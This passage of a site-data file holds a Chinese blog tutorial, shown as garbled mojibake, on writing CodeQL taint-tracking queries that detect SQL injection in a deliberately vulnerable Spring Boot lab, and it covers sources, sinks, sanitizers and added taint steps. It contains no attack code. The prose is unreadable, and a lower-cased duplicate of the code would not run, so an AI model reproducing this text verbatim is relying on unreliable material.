æä¸ä¸ªå½æ°ï¼å½æ°çåæ°ä¸ºmethodå¯¹è±¡ï¼å½æ°ä¸­å¤æ­è¯¥methodæ¯å¦ç¬¦åæ¡ä»¶ï¼è¿åTrueæèfalseã\n\nimport java\n\npredicate isGetMethod(Method method) {\n    exists( | method.getName().regexpMatch("get.*"))\n}\n\nfrom Method method\n\nwhere isGetMethod(method)\nselect method.getName(),method.getDeclaringType()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# è®¾ç½®sourceåsink\n\nsourcesãsinksãsanitizeræ¯æ±¡ç¹åæä¸­çæ ¸å¿ä¸åç»ãsourcesæçæ¯æ¼æ´æ±¡æçè¾å¥ç¹ï¼sinksæçæ¯æ¼æ´çæ§è¡ä½ç½®ï¼sanitizerç§°ä¸ºååå½æ°ï¼é»æ­äºä»sourceså°sinksçéè·¯ãåªæå½sourcesåsinksåæ¶å­å¨ï¼å¹¶ä¸ä¸å­å¨ä¸ä¸ªsanitizeré»æ­sourceså°sinksçéè·¯åæ¼æ´æ¯å­å¨çã\n\n\n\nå¨webé¡¹ç®ä¸­ï¼sourceæ¯ç¨æ·çè¾å¥ãå¦æä½¿ç¨çæ¯springæ¡æ¶æ­å»ºçé¡¹ç®ï¼sourceå¯ä»¥æ¯RequestMappingãæä»¬ä¸éè¦èªå·±å»ç¼åsourceçè§åï¼CodeQLå®æ¹æä¾äºSourceï¼å¶ä¸­åå«äºå¤§é¨åçSourceå¥å£ï¼å¸¸è§çSpringæ¡æ¶çå¥å£ä¹å¨éé¢ã\n\noverride predicate isSource(DataFlow::Node src) {\n    src instanceof RemoteFlowSource\n}\t\n\n\n1\n2\n3\n\n\nå¨è¿ä¸ªé¶åºä¸­ï¼ä½¿ç¨çJDBCTemplatesï¼å æ­¤å¨ä½¿ç¨queryæ¹æ³è¿è¡æ¥è¯¢æ¶ï¼ä¼ å¥sqlè¯­å¥ï¼å°±æ¯æ¬ä¾ä¸­çsinksãsinksçè®¾ç½®ä½¿ç¨å°äºexistså­æ¥è¯¢è¯­æ³ï¼existsçè¯­æ³æ¯ï¼exists(å£°æåé|å¤æ­è¡¨è¾¾å¼)ãå æ­¤æä»¬çsinkè®¾ç½®å¦ä¸ï¼\n\noverride predicate isSink(DataFlow::Node sink) {\n    exists(Method method,MethodAccess call | \n        method.hasName("query")\n        and call.getMethod() = method\n        and sink.asExpr() = call.getArgument(0)\n        )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# å¤æ­è¿é\n\næä»¬è®¾ç½®äºsourceåsinkï¼åé¢æ¯è¾å³é®çä¸æ­¥å°±æ¯å¤æ­ä»sourceå°sinkæ¯å¦è¿éãå ä¸ºå¦ææ¼æ´å­å¨ï¼åå¿é¡»è¦ä»sourceå°sinkå­å¨ä¸æ¡éè·¯ãå¥½å¨è¿é¡¹å·¥ä½ç±CodeQLå®æï¼CodeQLä½¿ç¨hasFlowPathå¤æ­æ¯å¦è¿éï¼åæ°åªéè¦ä¼ å¥æä»¬è®¾ç½®å¥½çsourceåsinkã\n\nfrom VulConfig config , DataFlow::PathNode source , DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(),source,sink,"source"\n\n\n1\n2\n3\n\n\n\n# å°ç»çæ¬\n\nå°ç®åä¸ºæ­¢ï¼æä»¬è®¾ç½®äºsourceãsinkï¼å¹¶ä¸ä½¿ç¨CodeQLçhasFlowPathå¤æ­è¿éï¼ä¸ä¸æ­¥éè¦å°è¿äºä¸è¥¿ç»è£èµ·æ¥ãæä»¬å¨åé¢ææå°è¿CodeQL classçæ¦å¿µï¼æä»¬è¿éä¹åªéè¦ç»§æ¿CodeQLæä¾çç¨äºæ°æ®æµåæçç¶ç±»TaintTracking::Configurationå³å¯ãæç»æä»¬ç¬¬ä¸çæ¬çä»£ç å¦ä¸ï¼\n\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\nclass VulConfig extends TaintTracking::Configuration {\n    VulConfig(){\n        this = "sqlInjectionConfig"\n    }\n\n    override predicate isSource(DataFlow::Node src) {\n        src instanceof RemoteFlowSource\n    }\n\n    override predicate isSink(DataFlow::Node sink) {\n        exists(Method method,MethodAccess call | \n            method.hasName("query")\n            and call.getMethod() = method\n            and sink.asExpr() = call.getArgument(0)\n            )\n    }\n\n}\n\nfrom VulConfig config , DataFlow::PathNode source , DataFlow::PathNode sink\n\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(),source,sink,"source"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nå¦å¤éè¦æ³¨æï¼æ³¨éé¨åååçéè¦ï¼åå«äºæ¥è¯¢çæºä¿¡æ¯ï¼åæç»ç»æçå±ç¤ºä¹æå¾å¤§çå³ç³»ï¼å æ­¤å¿é¡»è¦å¸¦ä¸ã\n\n/**\n * @id java/examples/vuldemo\n * @name Sql-Injection\n * @description Sql-Injection\n * @kind path-problem\n * @problem.severity warning\n */\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n\n\n# è¯¯æ¥å¤ç\n\nä¸ä¸æ­¥ä¸­å¾åºçä¸äºç»æä¸­ï¼æä¸ä¸ªç»ææ¯ä¸å¯è½äº§çSQLæ³¨å¥é®é¢çï¼å±äºè¯¯æ¥ãå½åæ°ç±»longç±»åæ¶ï¼æ¶æSQLè¯­å¥æ æ³è¿è¡æ¼æ¥åä¼ åï¼å æ­¤ä¸å­å¨SQLæ³¨å¥çå¯è½ï¼æä»¬éè¦å°å¶ä»ç»æä¸­æé¤ã\n\n\n\næä»¬æåºè¯¯æ¥çæ¹æ³å°±æ¯ä½¿ç¨sanitizer\n\n\n\nCodeQLæä¾äºä¸ä¸ªisSanitizeræ¹æ³ï¼è¯¥æ¹æ³åisSourceãisSinkä¸æ ·ï¼é½æ¯TaintTracking::Configurationæä¾çååæ¹æ³ãCodeQLå¨è¯¥æ¹æ³ä¸­æä¾äºé»è®¤çåºç¡æ°æ®ç±»åçè¿æ»¤ï¼ä½æ¯å¯¹äºListè¿ç§å¤åçæ°æ®ç±»åéè¦æä»¬å å¥å°isSanitizerä¸­ã\n\noverride predicate isSanitizer(DataFlow::Node node){\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt | node.getType() = pt \n        and pt.getTypeArgument(0) instanceof NumberType )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä»¥ä¸ä»£ç çææä¸ºï¼å¦æå½ånodeèç¹çç±»åä¸ºåºç¡ç±»åï¼æ°å­ç±»ååæ³åæ°å­ç±»å(æ¯å¦List)æ¶ï¼å°±åæ­æ°æ®æµï¼è®¤ä¸ºæ°æ®æµæ­æäºï¼ä¸ä¼ç»§ç»­å¾ä¸æ£æµãéæ°æ§è¡queryï¼è¯¯æ¥å°±å·²ç»è§£å³äºã\n\n\n# æ¼æ¥è§£å³\n\næ ¹æ®ly4n3å¸åçæç« ï¼å­å¨ä¸ä¸ªæ¼æ¥ï¼å ä¸ºOptionalè¿ç§ç±»åçä½¿ç¨æ²¡æå¨CodeQLçè¯­æ³åºéï¼æä»¥username.get()æ æ³è¯å«å°±æ­æäºãä½æ¯æå¨æµè¯çæ¶ååç°ï¼ä¼¼ä¹CodeQLè½å¤è¯å«è¿æ¡éè·¯äºï¼å¯è½CodeQLæ´æ°äºå§ãè¿éå°±ç®åæä¸ä¸å¦æåºç°äºæ¼æ¥æä¹è§£å³ã\n\nCodeQLæä¾äºä¸ä¸ªisAdditionalTaintStepæ¹æ³ï¼è¯¥æ¹æ³å¯ä»¥å°æ­æçæ°æ®éè·¯æ¥ä¸ã\n\n\n\nisAdditionalTaintStepæ¹æ³æ¯CodeQLçç±»TaintTracking::Configurationæä¾ççæ¹æ³ãå®çä½ç¨æ¯å°ä¸ä¸ªå¯æ§èç¹ï¼Aå¼ºå¶ä¼ éç»å¦å¤ä¸ä¸ªèç¹Bï¼é£ä¹èç¹Bä¹å°±æäºå¯æ§èç¹ã\n\nl4yn3ç»çä»£ç ï¼\n\n/**\n * @id java/examples/vuldemo\n * @name Sql-Injection\n * @description Sql-Injection\n * @kind path-problem\n * @problem.severity warning\n */\n\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\npredicate isTaintedString(Expr expSrc, Expr expDest) {\n    exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName("get") and method.getDeclaringType().toString() = "Optional<String>" and call1.getArgument(0).getType().toString() = "Optional<String>"  )\n}\n\nclass VulConfig extends TaintTracking::Configuration {\n  VulConfig() { this = "SqlInjectionConfig" }\n\n  override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource }\n\n  override predicate isSanitizer(DataFlow::Node node) {\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )\n  }\n\n  override predicate isSink(DataFlow::Node sink) {\n    exists(Method method, MethodAccess call |\n      method.hasName("query")\n      and\n      call.getMethod() = method and\n      sink.asExpr() = call.getArgument(0)\n    )\n  }\noverride predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {\n    isTaintedString(node1.asExpr(), node2.asExpr())\n  }\n}\n\n\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, "source"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# åèèµæ\n\nl4yn3 Freebufï¼https://www.freebuf.com/articles/web/283795.html\n\nCodeQL ææ¡£ï¼https://codeql.github.com/docs/',normalizedContent:'# codeqlä»å¥é¨å°æ¾å¼\n\n> è¿ç¯æç« æ¯æå¨å­¦ä¹ codeqlæ¶çç¬è®°ï¼è¯¥æç« å®å¨åèäºl4yn3å¸åå¨freebufä¸åè¡¨ãcodeqlä»å¥é¨å°æ¾å¼ããæç« çé¾æ¥ä¼æ¾å°åèèµæä¸­ãè³äºä¸ºä»ä¹è¦éæ°åä¸ç¯ç±»ä¼¼çæç« ï¼åªæ¯åçº¯ä¸ºäºè®°å½ä¸ä¸èªå·±å­¦ä¹ codeqlä½¿ç¨çè¿ç¨éå°çé®é¢ã\n\n\n# ä¸ºä»ä¹æ¯codeql\n\ncodeqlä½ä¸ºä»£ç å®å¨å®¡è®¡çä¸æ¬¾ååå¥½ç¨åé«æçå·¥å·ï¼å¹¶ä¸æ¯å­ç©ºåºç°çãè¿è¦ä»ä»£ç å®¡è®¡çåå²è¯´èµ·ã\n\nå¨ææ©æçæ¶åï¼ç±äºç³»ç»è§æ¨¡è¾å°ï¼ä»£ç éè¿æ¯æå°ï¼ä»£ç ä¹é´çé»è¾è°ç¨å³ç³»ä¹å¾æ¸æ°ï¼å®å¨äººåéå¸¸éç¨äººå·¥çæ¹å¼å»å¯»æ¾ä»£ç ä¸­å­å¨çå®å¨é®é¢ãèäººå·¥å®¡è®¡ä¸è¬æä¸ç§å¸¸è§çå®¡è®¡æè·¯ï¼ç¬¬ä¸ç§æ¯å¨æéè¯»ï¼å¨å¨é¢çéè¯»ä»£ç ä¹åï¼å¯¹ä»£ç æä¸ä¸ªå¨é¢ççè§£ï¼ç¥éæ¯ä¸é¨åä»£ç çåè½ï¼ç¶åç»åå·ä½çåè½åç°ä»£ç ä¸­å­å¨çé®é¢ï¼è¿ç§å®¡è®¡çæ¹å¼ååçç»è´ï¼ä½æ¯ä¹ååçèæ¶ï¼ç¬¬äºç§æ¹å¼æ¯å®ä½å±é©çå½æ°ï¼ç¶ååä¸è¿½æº¯å°å±é©æ°æ®è¾å¥çä½ç½®ï¼å¦ææ°æ®æµæ²¡æä¸­æ­åå­å¨ä¸æ¡ä»ç¨æ·è¾å¥å°å±é©å½æ°çéè·¯ï¼è¿ç§æ¹å¼è½ç¶å¿«æ·ï¼ä½æ¯ä¸å¨é¢ï¼å¯¹åºä¸äºé»è¾æ¼æ´æ è½ä¸ºåï¼ç¬¬ä¸ç§æ¹å¼æ¯éå¯¹ä¸äºç¹å®çåè½ç¹è¿è¡å¨èçå»ºæ¨¡åå®¡è®¡ï¼è¿ç§æ¹å¼ç¸å¯¹è¾å¿«ä¸å¯¹äºé»è¾æ¼æ´ä¹è½æå¾å¥½çææ¡ã\n\nä½æ¯éçé¡¹ç®å¤æåº¦åä»£ç éä¸çææ°çº§å¢é¿ï¼äººå·¥çæ¹å¼å¾é¾è¿è¡å¨é¢çå®¡è®¡ï¼å æ­¤å°±éè¦ä¸äºè½¯ä»¶çä»å¥ï¼éåäººå·¥å®æä»£ç å®¡è®¡ãè¿ä¸é¶æ®µçä¸äºå·¥å·ä¾å¦ripsãcobraå¯ä»¥å¸®å©å®ä½å°å±é©å½æ°ï¼ç¶ååç±äººå·¥ç¡®è®¤æ¯å¦å­å¨æ¼æ´ãè¿ç§æ¹å¼ä¹æ¯éè¦ä¾é äººå·¥è¿è¡å¤å®ï¼å®å¨äººåçååè¿æ¯æ¯è¾å¤§ï¼å æ­¤ä¹å°±è¿­ä»£åºäºä¸äºèªå¨åçä»£ç å®¡è®¡äº§åï¼ä¾å¦å¸¸ç¨çcheckmarxãfortify scaç­ãcodeqlä¹æ¯å±äºè¿ä¸ç±»åçå·¥å·ï¼ç¸è¾äºå¶ä»å ç§å·¥å·èè¨ï¼codeqlå¼æºãå¯èªå®ä¹ç¨åº¦é«çä¼ç¹ååå¼å¾å®å¨äººåå­¦ä¹ åä½¿ç¨ã\n\n\n# ç¯å¢ä»ç»\n\nè¿éä½¿ç¨çæ¯l4yn3å¸åæ­å»ºçé¶åºï¼è¯¥é¶åºæ¯ä½¿ç¨springbootæ­å»ºçï¼éé¢åå«äºä¸äºå¸¸è§æ¼æ´ç±»åãè¿ä¸ç¯å°±å©ç¨codeqlå»èªå¨æ£ç´¢è¿äºæ¼æ´ï¼å¹¶åå°è¯¯æ¥åæ¼æ¥é®é¢ãæçç¯å¢éç½®å¦ä¸ï¼\n\n * æä½ç³»ç»ï¼mac os\n * javaçæ¬ï¼1.8.0_311\n * mavençæ¬ï¼3.8.4\n * é¶åºä¸è½½å°åï¼https://github.com/l4yn3/micro_service_seclab/\n\n\n# codeqlåå»ºå¹¶å¯¼å¥æ°æ®åº\n\nå¯¹äºcodeqlçç¯å¢æ­å»ºåæ¬vscodeãcodeql cliçç¸å³éç½®å¨ä¹åçæç« ä¸­æè¯¦ç»åè¿ï¼è¿éå°±ä¸åèµè¿°ã\n\nå¨éç½®å®æç¯å¢å¹¶ä¸å°é¶åºä»£ç åéå°æ¬å°ä¹åï¼æä»¬ä½¿ç¨codeql cliçç¸å³å½ä»¤çæä¸ä¸ªæ°æ®åºï¼\n\ncodeql database create ./seclab_db --language=java --command="mvn clean install --file pom.xml" --source-root=./micro_service_seclab\n\n# --language æå®è¯­è¨\n# --command="mvn clean install --file pom.xml" ç¼è¯å½ä»¤javaè¯­è¨ä½¿ç¨mavenè¿è¡ç¼è¯\n# --source-root=  é¡¹ç®è·¯å¾\n\n\n1\n2\n3\n4\n5\n\n\næç»åºç°successfully created databaseä»£è¡¨æ°æ®åºåå»ºå®æäºï¼å¨åå»ºè¿ç¨ä¸­å¦æåçæ¥éï¼å¯ä»¥å é¤æ°æ®åºåæ¬¡è¿è¡ãæ³¨æè¦ä¿æå¨è·¯å¾ä¸­æ²¡æç©ºæ ¼å­å¨ã\n\n\n\nå¨åå»ºå®ææ°æ®åºä¹åï¼å¯ä»¥å°æ°æ®åºå¯¼å¥å°vscodeä¸­ã\n\n\n\nè¿è¡hello worldæµè¯ç¯å¢æ¯å¦æ­£å¸¸ã\n\nselect "helloworld"\n\n\n1\n\n\n\n\nè³æ­¤ï¼ç¯å¢å·²ç»æ­å»ºå¥½äºï¼æ°æ®åºä¹å·²ç»å¯¼å¥äºãåé¢å°±å¼å§ç¼åç¸åºçæ¥è¯¢è¯­å¥ã\n\n\n# codeql åºç¡è¯­æ³\n\n\n# åºç¡ql\n\næä»¬å©ç¨codeqlçå½ä»¤åå»ºäºcodeqlæ°æ®åºï¼ç¶åéè¦ä½¿ç¨codeqlæä¾çå¼æºçè§ååºç¼åç¸å³çè§åï¼åç°å®å¨æ¼æ´ã\n\n\n\ncodeqlæ¯ä¸ç§ç±»sqlçæ¥è¯¢è¯­å¥ï¼ä¸»è¦ç±åé¨åç»æï¼\n\nimport java # å¯¼å¥è¯­å¥ å¯¼å¥ç¸å³çåº\n\nfrom ... # å®ä¹ç¸å³çåé\nwhere # è®¾ç½®æ¥è¯¢çæ¡ä»¶\nselect # æ¾ç¤ºæ¥è¯¢çç»æ\n\n\n1\n2\n3\n4\n5\n\n\nå¨fromè¯­å¥ä¸­ï¼æä»¬éå¸¸ä½¿ç¨codeqlæä¾ç»æä»¬çå¾å¤ç±»åºæ¥å£°æåéãæä»¬ç»å¸¸ä½¿ç¨çç±»åºæå¦ä¸çå ä¸ªï¼\n\nåç§°             è§£é\nmethod         æ¹æ³ç±»ï¼method methodè¡¨ç¤ºè·åå½åé¡¹ç®ä¸­ææçæ¹æ³\nmethodaccess   æ¹æ³è°ç¨ç±»ï¼methodaccess callè¡¨ç¤ºè·åå½åé¡¹ç®å½ä¸­çæææ¹æ³è°ç¨\nparameter      åæ°ç±»ï¼parameterè¡¨ç¤ºè·åå½åé¡¹ç®å½ä¸­ææçåæ°\n\næ¯å¦æä»¬å¯ä»¥ä½¿ç¨æ¥è¯¢è¯­å¥æ¾åºææåä¸ºget*çæ¹æ³ã\n\nimport java\n\nfrom method method\nwhere method.getname().regexpmatch("get.*")\nselect method.getname(),method.getdeclaringtype()\n\n\n1\n2\n3\n4\n5\n\n\næä»¬å¯ä»¥å°whereåé¢çæ¥è¯¢æ¡ä»¶å°è£æä¸ä¸ªå½æ°ï¼å½æ°çåæ°ä¸ºmethodå¯¹è±¡ï¼å½æ°ä¸­å¤æ­è¯¥methodæ¯å¦ç¬¦åæ¡ä»¶ï¼è¿åtrueæèfalseã\n\nimport java\n\npredicate isgetmethod(method method) {\n    exists( | method.getname().regexpmatch("get.*"))\n}\n\nfrom method method\n\nwhere isgetmethod(method)\nselect method.getname(),method.getdeclaringtype()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# è®¾ç½®sourceåsink\n\nsourcesãsinksãsanitizeræ¯æ±¡ç¹åæä¸­çæ ¸å¿ä¸åç»ãsourcesæçæ¯æ¼æ´æ±¡æçè¾å¥ç¹ï¼sinksæçæ¯æ¼æ´çæ§è¡ä½ç½®ï¼sanitizerç§°ä¸ºååå½æ°ï¼é»æ­äºä»sourceså°sinksçéè·¯ãåªæå½sourcesåsinksåæ¶å­å¨ï¼å¹¶ä¸ä¸å­å¨ä¸ä¸ªsanitizeré»æ­sourceså°sinksçéè·¯åæ¼æ´æ¯å­å¨çã\n\n\n\nå¨webé¡¹ç®ä¸­ï¼sourceæ¯ç¨æ·çè¾å¥ãå¦æä½¿ç¨çæ¯springæ¡æ¶æ­å»ºçé¡¹ç®ï¼sourceå¯ä»¥æ¯requestmappingãæä»¬ä¸éè¦èªå·±å»ç¼åsourceçè§åï¼codeqlå®æ¹æä¾äºsourceï¼å¶ä¸­åå«äºå¤§é¨åçsourceå¥å£ï¼å¸¸è§çspringæ¡æ¶çå¥å£ä¹å¨éé¢ã\n\noverride predicate issource(dataflow::node src) {\n    src instanceof remoteflowsource\n}\t\n\n\n1\n2\n3\n\n\nå¨è¿ä¸ªé¶åºä¸­ï¼ä½¿ç¨çjdbctemplatesï¼å æ­¤å¨ä½¿ç¨queryæ¹æ³è¿è¡æ¥è¯¢æ¶ï¼ä¼ å¥sqlè¯­å¥ï¼å°±æ¯æ¬ä¾ä¸­çsinksãsinksçè®¾ç½®ä½¿ç¨å°äºexistså­æ¥è¯¢è¯­æ³ï¼existsçè¯­æ³æ¯ï¼exists(å£°æåé|å¤æ­è¡¨è¾¾å¼)ãå æ­¤æä»¬çsinkè®¾ç½®å¦ä¸ï¼\n\noverride predicate issink(dataflow::node sink) {\n    exists(method method,methodaccess call | \n        method.hasname("query")\n        and call.getmethod() = method\n        and sink.asexpr() = call.getargument(0)\n        )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# å¤æ­è¿é\n\næä»¬è®¾ç½®äºsourceåsinkï¼åé¢æ¯è¾å³é®çä¸æ­¥å°±æ¯å¤æ­ä»sourceå°sinkæ¯å¦è¿éãå ä¸ºå¦ææ¼æ´å­å¨ï¼åå¿é¡»è¦ä»sourceå°sinkå­å¨ä¸æ¡éè·¯ãå¥½å¨è¿é¡¹å·¥ä½ç±codeqlå®æï¼codeqlä½¿ç¨hasflowpathå¤æ­æ¯å¦è¿éï¼åæ°åªéè¦ä¼ å¥æä»¬è®¾ç½®å¥½çsourceåsinkã\n\nfrom vulconfig config , dataflow::pathnode source , dataflow::pathnode sink\nwhere config.hasflowpath(source, sink)\nselect source.getnode(),source,sink,"source"\n\n\n1\n2\n3\n\n\n\n# å°ç»çæ¬\n\nå°ç®åä¸ºæ­¢ï¼æä»¬è®¾ç½®äºsourceãsinkï¼å¹¶ä¸ä½¿ç¨codeqlçhasflowpathå¤æ­è¿éï¼ä¸ä¸æ­¥éè¦å°è¿äºä¸è¥¿ç»è£èµ·æ¥ãæä»¬å¨åé¢ææå°è¿codeql classçæ¦å¿µï¼æä»¬è¿éä¹åªéè¦ç»§æ¿codeqlæä¾çç¨äºæ°æ®æµåæçç¶ç±»tainttracking::configurationå³å¯ãæç»æä»¬ç¬¬ä¸çæ¬çä»£ç å¦ä¸ï¼\n\nimport java\nimport semmle.code.java.dataflow.flowsources\nimport semmle.code.java.security.queryinjection\nimport dataflow::pathgraph\n\nclass vulconfig extends tainttracking::configuration {\n    vulconfig(){\n        this = "sqlinjectionconfig"\n    }\n\n    override predicate issource(dataflow::node src) {\n        src instanceof remoteflowsource\n    }\n\n    override predicate issink(dataflow::node sink) {\n        exists(method method,methodaccess call | \n            method.hasname("query")\n            and call.getmethod() = method\n            and sink.asexpr() = call.getargument(0)\n            )\n    }\n\n}\n\nfrom vulconfig config , dataflow::pathnode source , dataflow::pathnode sink\n\nwhere config.hasflowpath(source, sink)\nselect source.getnode(),source,sink,"source"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nå¦å¤éè¦æ³¨æï¼æ³¨éé¨åååçéè¦ï¼åå«äºæ¥è¯¢çæºä¿¡æ¯ï¼åæç»ç»æçå±ç¤ºä¹æå¾å¤§çå³ç³»ï¼å æ­¤å¿é¡»è¦å¸¦ä¸ã\n\n/**\n * @id java/examples/vuldemo\n * @name sql-injection\n * @description sql-injection\n * @kind path-problem\n * @problem.severity warning\n */\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n\n\n# è¯¯æ¥å¤ç\n\nä¸ä¸æ­¥ä¸­å¾åºçä¸äºç»æä¸­ï¼æä¸ä¸ªç»ææ¯ä¸å¯è½äº§çsqlæ³¨å¥é®é¢çï¼å±äºè¯¯æ¥ãå½åæ°ç±»longç±»åæ¶ï¼æ¶æsqlè¯­å¥æ æ³è¿è¡æ¼æ¥åä¼ åï¼å æ­¤ä¸å­å¨sqlæ³¨å¥çå¯è½ï¼æä»¬éè¦å°å¶ä»ç»æä¸­æé¤ã\n\n\n\næä»¬æåºè¯¯æ¥çæ¹æ³å°±æ¯ä½¿ç¨sanitizer\n\n\n\ncodeqlæä¾äºä¸ä¸ªissanitizeræ¹æ³ï¼è¯¥æ¹æ³åissourceãissinkä¸æ ·ï¼é½æ¯tainttracking::configurationæä¾çååæ¹æ³ãcodeqlå¨è¯¥æ¹æ³ä¸­æä¾äºé»è®¤çåºç¡æ°æ®ç±»åçè¿æ»¤ï¼ä½æ¯å¯¹äºlistè¿ç§å¤åçæ°æ®ç±»åéè¦æä»¬å å¥å°issanitizerä¸­ã\n\noverride predicate issanitizer(dataflow::node node){\n    node.gettype() instanceof primitivetype or\n    node.gettype() instanceof boxedtype or\n    node.gettype() instanceof numbertype or\n    exists(parameterizedtype pt | node.gettype() = pt \n        and pt.gettypeargument(0) instanceof numbertype )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä»¥ä¸ä»£ç çææä¸ºï¼å¦æå½ånodeèç¹çç±»åä¸ºåºç¡ç±»åï¼æ°å­ç±»ååæ³åæ°å­ç±»å(æ¯å¦list)æ¶ï¼å°±åæ­æ°æ®æµï¼è®¤ä¸ºæ°æ®æµæ­æäºï¼ä¸ä¼ç»§ç»­å¾ä¸æ£æµãéæ°æ§è¡queryï¼è¯¯æ¥å°±å·²ç»è§£å³äºã\n\n\n# æ¼æ¥è§£å³\n\næ ¹æ®ly4n3å¸åçæç« ï¼å­å¨ä¸ä¸ªæ¼æ¥ï¼å ä¸ºoptionalè¿ç§ç±»åçä½¿ç¨æ²¡æå¨codeqlçè¯­æ³åºéï¼æä»¥username.get()æ æ³è¯å«å°±æ­æäºãä½æ¯æå¨æµè¯çæ¶ååç°ï¼ä¼¼ä¹codeqlè½å¤è¯å«è¿æ¡éè·¯äºï¼å¯è½codeqlæ´æ°äºå§ãè¿éå°±ç®åæä¸ä¸å¦æåºç°äºæ¼æ¥æä¹è§£å³ã\n\ncodeqlæä¾äºä¸ä¸ªisadditionaltaintstepæ¹æ³ï¼è¯¥æ¹æ³å¯ä»¥å°æ­æçæ°æ®éè·¯æ¥ä¸ã\n\n\n\nisadditionaltaintstepæ¹æ³æ¯codeqlçç±»tainttracking::configurationæä¾ççæ¹æ³ãå®çä½ç¨æ¯å°ä¸ä¸ªå¯æ§èç¹ï¼aå¼ºå¶ä¼ éç»å¦å¤ä¸ä¸ªèç¹bï¼é£ä¹èç¹bä¹å°±æäºå¯æ§èç¹ã\n\nl4yn3ç»çä»£ç ï¼\n\n/**\n * @id java/examples/vuldemo\n * @name sql-injection\n * @description sql-injection\n * @kind path-problem\n * @problem.severity warning\n */\n\nimport java\nimport semmle.code.java.dataflow.flowsources\nimport semmle.code.java.security.queryinjection\nimport dataflow::pathgraph\n\npredicate istaintedstring(expr expsrc, expr expdest) {\n    exists(method method, methodaccess call, methodaccess call1 | expsrc = call1.getargument(0) and expdest=call and call.getmethod() = method and method.hasname("get") and method.getdeclaringtype().tostring() = "optional<string>" and call1.getargument(0).gettype().tostring() = "optional<string>"  )\n}\n\nclass vulconfig extends tainttracking::configuration {\n  vulconfig() { this = "sqlinjectionconfig" }\n\n  override predicate issource(dataflow::node src) { src instanceof remoteflowsource }\n\n  override predicate issanitizer(dataflow::node node) {\n    node.gettype() instanceof primitivetype or\n    node.gettype() instanceof boxedtype or\n    node.gettype() instanceof numbertype or\n    exists(parameterizedtype pt| node.gettype() = pt and pt.gettypeargument(0) instanceof numbertype )\n  }\n\n  override predicate issink(dataflow::node sink) {\n    exists(method method, methodaccess call |\n      method.hasname("query")\n      and\n      call.getmethod() = method and\n      sink.asexpr() = call.getargument(0)\n    )\n  }\noverride predicate isadditionaltaintstep(dataflow::node node1, dataflow::node node2) {\n    istaintedstring(node1.asexpr(), node2.asexpr())\n  }\n}\n\n\nfrom vulconfig config, dataflow::pathnode source, dataflow::pathnode sink\nwhere config.hasflowpath(source, sink)\nselect source.getnode(), source, sink, "source"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# åèèµæ\n\nl4yn3 freebufï¼https://www.freebuf.com/articles/web/283795.html\n\ncodeql ææ¡£ï¼https://codeql.github.com/docs/',charsets:{cjk:!0},lastUpdated:"2022/04/05, 13:01:38",lastUpdatedTimestamp:1649163698e3},{title:"ååºååæ¼æ´åç - åå°",frontmatter:{title:"ååºååæ¼æ´åç - åå°",date:"2022-03-12T00:00:00.000Z",permalink:"/sec/vuln/deserialization/reflaction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","æ¼æ´åç"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/00.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86-%E5%8F%8D%E5%B0%84.html",relativePath:"02.å®å